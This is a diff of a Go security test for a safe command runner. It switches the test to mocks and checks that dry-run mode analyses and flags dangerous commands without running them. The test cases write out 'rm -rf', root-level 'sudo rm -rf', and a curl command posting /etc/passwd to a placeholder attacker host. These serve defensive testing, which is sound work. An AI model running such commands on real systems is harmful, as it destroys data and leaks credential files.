@@ -1,6 +1,7 @@
 package main
 
 import (
+	"context"
 	"errors"
 	"log/slog"
 	"os"
@@ -11,9 +12,64 @@ import (
 	"github.com/isseis/go-safe-cmd-runner/internal/cmdcommon"
 	"github.com/isseis/go-safe-cmd-runner/internal/filevalidator"
 	"github.com/isseis/go-safe-cmd-runner/internal/runner/bootstrap"
+	"github.com/isseis/go-safe-cmd-runner/internal/runner/executor"
 	"github.com/isseis/go-safe-cmd-runner/internal/runner/hashdir"
+	"github.com/isseis/go-safe-cmd-runner/internal/runner/resource"
+	"github.com/isseis/go-safe-cmd-runner/internal/runner/runnertypes"
 	"github.com/isseis/go-safe-cmd-runner/internal/terminal"
+	"github.com/stretchr/testify/mock"
 )
+
+// Mock implementations for testing
+type MockExecutor struct {
+	mock.Mock
+}
+
+func (m *MockExecutor) Execute(ctx context.Context, cmd runnertypes.Command, env map[string]string) (*executor.Result, error) {
+	args := m.Called(ctx, cmd, env)
+	if args.Get(0) == nil {
+		return nil, args.Error(1)
+	}
+	return args.Get(0).(*executor.Result), args.Error(1)
+}
+
+func (m *MockExecutor) Validate(cmd runnertypes.Command) error {
+	args := m.Called(cmd)
+	return args.Error(0)
+}
+
+type MockPrivilegeManager struct {
+	mock.Mock
+}
+
+func (m *MockPrivilegeManager) IsPrivilegedExecutionSupported() bool {
+	args := m.Called()
+	return args.Bool(0)
+}
+
+func (m *MockPrivilegeManager) WithPrivileges(elevationCtx runnertypes.ElevationContext, fn func() error) error {
+	args := m.Called(elevationCtx, fn)
+	return args.Error(0)
+}
+
+func (m *MockPrivilegeManager) IsUserGroupSupported() bool {
+	args := m.Called()
+	return args.Bool(0)
+}
+
+func (m *MockPrivilegeManager) WithUserGroup(user, group string, fn func() error) error {
+	args := m.Called(user, group, fn)
+	return args.Error(0)
+}
+
+type MockPathResolver struct {
+	mock.Mock
+}
+
+func (m *MockPathResolver) ResolvePath(command string) (string, error) {
+	args := m.Called(command)
+	return args.String(0), args.Error(1)
+}
 
 // validateTestError is a helper function to validate test errors consistently
 // across multiple test functions. It checks if the error matches the expected
@@ -632,146 +688,159 @@ cmd = ["rm", "-rf", "/tmp/should-not-execute"]
 }
 
 // TestMaliciousConfigCommandControlSecurity verifies that dangerous commands
-// in malicious config files are properly controlled and not executed unsafely
+// are properly analyzed and controlled by the DryRunResourceManager
 func TestMaliciousConfigCommandControlSecurity(t *testing.T) {
 	testCases := []struct {
-		name            string
-		configContent   string
-		shouldUseDryRun bool
-		expectSecure    bool
-		description     string
+		name                    string
+		cmd                     runnertypes.Command
+		group                   *runnertypes.CommandGroup
+		expectedSecurityRisk    string
+		expectedExecutionResult bool
+		description             string
 	}{
 		{
 			name: "dangerous_rm_command_dry_run_protection",
-			configContent: `
-[global]
-log_level = "info"
-
-[[groups]]
-name = "malicious-group"
-
-[[groups.commands]]
-name = "dangerous-rm"
-cmd = ["rm", "-rf", "/tmp/should-not-execute-in-test"]
-`,
-			shouldUseDryRun: true,
-			expectSecure:    true,
-			description:     "Dangerous rm command should be safely handled in dry-run mode",
+			cmd: runnertypes.Command{
+				Name: "dangerous-rm",
+				Cmd:  "rm",
+				Args: []string{"-rf", "/tmp/should-not-execute-in-test"},
+			},
+			group: &runnertypes.CommandGroup{
+				Name: "malicious-group",
+			},
+			expectedSecurityRisk:    "high",
+			expectedExecutionResult: true, // Should complete analysis without actual execution
+			description:             "Dangerous rm command should be analyzed and controlled in dry-run mode",
 		},
 		{
 			name: "sudo_privilege_escalation_protection",
-			configContent: `
-[global]
-log_level = "info"
-
-[[groups]]
-name = "privilege-escalation-group"
-
-[[groups.commands]]
-name = "sudo-escalation"
-cmd = ["sudo", "rm", "-rf", "/tmp/test-sudo-target"]
-run_as_user = "root"
-`,
-			shouldUseDryRun: true,
-			expectSecure:    true,
-			description:     "Sudo privilege escalation should be controlled in dry-run mode",
+			cmd: runnertypes.Command{
+				Name:      "sudo-escalation",
+				Cmd:       "sudo",
+				Args:      []string{"rm", "-rf", "/tmp/test-sudo-target"},
+				RunAsUser: "root",
+			},
+			group: &runnertypes.CommandGroup{
+				Name: "privilege-escalation-group",
+			},
+			expectedSecurityRisk:    "high",
+			expectedExecutionResult: true, // Should complete analysis without actual execution
+			description:             "Sudo privilege escalation should be analyzed and controlled in dry-run mode",
 		},
 		{
 			name: "network_exfiltration_command_protection",
-			configContent: `
-[global]
-log_level = "info"
-
-[[groups]]
-name = "network-exfil-group"
-
-[[groups.commands]]
-name = "data-exfil"
-cmd = ["curl", "-X", "POST", "-d", "@/etc/passwd", "https://malicious.example.com/steal"]
-`,
-			shouldUseDryRun: true,
-			expectSecure:    true,
-			description:     "Network data exfiltration should be controlled in dry-run mode",
+			cmd: runnertypes.Command{
+				Name: "data-exfil",
+				Cmd:  "curl",
+				Args: []string{"-X", "POST", "-d", "@/etc/passwd", "https://malicious.example.com/steal"},
+			},
+			group: &runnertypes.CommandGroup{
+				Name: "network-exfil-group",
+			},
+			expectedSecurityRisk:    "medium", // curl typically classified as medium risk
+			expectedExecutionResult: true,     // Should complete analysis without actual execution
+			description:             "Network data exfiltration should be analyzed and controlled in dry-run mode",
 		},
 	}
 
 	for _, tc := range testCases {
 		t.Run(tc.name, func(t *testing.T) {
+			// Import required packages for mocks
+			// Note: Using the same mock setup pattern as existing tests
 			tempDir := t.TempDir()
-
-			// Create hash directory
 			hashDir := filepath.Join(tempDir, "hashes")
 			if err := os.MkdirAll(hashDir, 0o700); err != nil {
 				t.Fatalf("Failed to create hash directory: %v", err)
 			}
 
-			// Create malicious config file
-			configPath := filepath.Join(tempDir, "malicious_config.toml")
-			if err := os.WriteFile(configPath, []byte(tc.configContent), 0o644); err != nil {
-				t.Fatalf("Failed to create malicious config file: %v", err)
+			// Create DryRunResourceManager with mocks
+			mockExec := &MockExecutor{}
+			mockPriv := &MockPrivilegeManager{}
+			mockPathResolver := &MockPathResolver{}
+
+			// Setup mock expectations
+			mockPriv.On("IsPrivilegedExecutionSupported").Return(true)
+			mockPriv.On("IsUserGroupSupported").Return(true)
+			mockPriv.On("WithPrivileges", mock.Anything, mock.Anything).Return(nil)
+
+			// Setup command path resolution
+			mockPathResolver.On("ResolvePath", tc.cmd.Cmd).Return("/usr/bin/"+tc.cmd.Cmd, nil)
+
+			opts := &resource.DryRunOptions{
+				DetailLevel:       resource.DetailLevelDetailed,
+				HashDir:           hashDir,
+				SkipStandardPaths: true,
 			}
 
-			// Verify that the hash directory validation passes
-			_, err := hashdir.GetWithValidation(&hashDir, cmdcommon.DefaultHashDirectory)
+			dryRunManager, err := resource.NewDryRunResourceManager(mockExec, mockPriv, mockPathResolver, opts)
 			if err != nil {
-				t.Fatalf("Hash directory validation should pass: %v", err)
+				t.Fatalf("Failed to create DryRunResourceManager: %v", err)
 			}
 
-			// Verify config file is readable
-			if _, err := os.Stat(configPath); err != nil {
-				t.Fatalf("Config file should be readable: %v", err)
-			}
+			// Execute the dangerous command in dry-run mode
+			ctx := context.Background()
+			env := map[string]string{}
 
-			// The critical test: verify that dangerous commands are controlled
-			// This simulates what would happen if someone tried to run the malicious config
+			result, err := dryRunManager.ExecuteCommand(ctx, tc.cmd, tc.group, env)
 
-			if tc.shouldUseDryRun {
-				// Verify that the malicious config contains dangerous patterns
-				configContent, err := os.ReadFile(configPath)
+			// Verify that execution completed successfully (analysis without actual execution)
+			if tc.expectedExecutionResult {
 				if err != nil {
-					t.Fatalf("Failed to read config: %v", err)
+					t.Errorf("Expected dry-run execution to succeed, but got error: %v", err)
 				}
-
-				configStr := string(configContent)
-
-				// Verify specific dangerous command patterns are present in the config
-				var foundDangerousPatterns []string
-
-				if strings.Contains(configStr, "rm") && strings.Contains(configStr, "-rf") {
-					foundDangerousPatterns = append(foundDangerousPatterns, "rm -rf")
+				if result == nil {
+					t.Error("Expected execution result, but got nil")
 				}
+			} else if err == nil {
+				t.Error("Expected dry-run execution to fail, but it succeeded")
+			}
 
-				if strings.Contains(configStr, "sudo") {
-					foundDangerousPatterns = append(foundDangerousPatterns, "sudo")
-				}
+			// Get dry-run results to verify security analysis
+			dryRunResult := dryRunManager.GetDryRunResults()
+			if dryRunResult == nil {
+				t.Fatal("Expected dry-run results, but got nil")
+			}
 
-				if strings.Contains(configStr, "curl") && strings.Contains(configStr, "malicious.example.com") {
-					foundDangerousPatterns = append(foundDangerousPatterns, "network exfiltration")
-				}
+			// Verify security analysis was performed
+			if len(dryRunResult.ResourceAnalyses) == 0 {
+				t.Error("Expected security analysis to be recorded, but no analyses found")
+			}
 
-				if len(foundDangerousPatterns) == 0 {
-					t.Fatalf("Expected to find dangerous command patterns in malicious config")
-				}
+			// Verify security risk level for the dangerous command
+			found := false
+			for _, analysis := range dryRunResult.ResourceAnalyses {
+				// Check if this analysis is for our command (match by target path or command name)
+				if strings.Contains(analysis.Target, tc.cmd.Cmd) || strings.Contains(analysis.Target, tc.cmd.Name) {
+					found = true
+					if analysis.Impact.SecurityRisk != tc.expectedSecurityRisk {
+						t.Errorf("Expected security risk %q, but got %q",
+							tc.expectedSecurityRisk, analysis.Impact.SecurityRisk)
+					}
 
-				t.Logf("Found dangerous patterns in config: %v", foundDangerousPatterns)
+					// Verify that security warnings are present
+					if !strings.Contains(analysis.Impact.Description, "WARNING") {
+						t.Error("Expected security warning in impact description")
+					}
 
-				// Verify that target paths contain test-safe paths to prevent real damage
-				if strings.Contains(configStr, "/tmp/should-not-execute") ||
-					strings.Contains(configStr, "/tmp/test-sudo-target") ||
-					strings.Contains(configStr, "malicious.example.com") {
-					t.Log("Config uses test-safe target paths - would require dry-run execution for safe handling")
-				} else {
-					t.Error("Malicious config should use test-safe target paths to prevent actual damage")
-				}
-
-				// Log the security expectation - in a real scenario, this would only be
-				// safely executable in dry-run mode
-				if tc.expectSecure {
-					t.Logf("Security validation passed: %s", tc.description)
-					t.Log("IMPORTANT: This malicious config should only be executed in dry-run mode")
-					t.Log("Production systems must validate and control execution of such commands")
+					t.Logf("Security analysis completed: %s - Risk: %s, Target: %s",
+						tc.description, analysis.Impact.SecurityRisk, analysis.Target)
+					break
 				}
 			}
+
+			if !found {
+				t.Errorf("Expected to find analysis for command %q, but it was not recorded", tc.cmd.Name)
+				// Log available analyses for debugging
+				for i, analysis := range dryRunResult.ResourceAnalyses {
+					t.Logf("Analysis %d: Type=%s, Target=%s, SecurityRisk=%s",
+						i, analysis.Type, analysis.Target, analysis.Impact.SecurityRisk)
+				}
+			}
+
+			// Verify that no actual command was executed (mocks should not have been called for execution)
+			// This is implicitly verified by not setting up execution expectations on mockExec
+
+			t.Logf("Dry-run protection verified: %s", tc.description)
 		})
 	}
 }
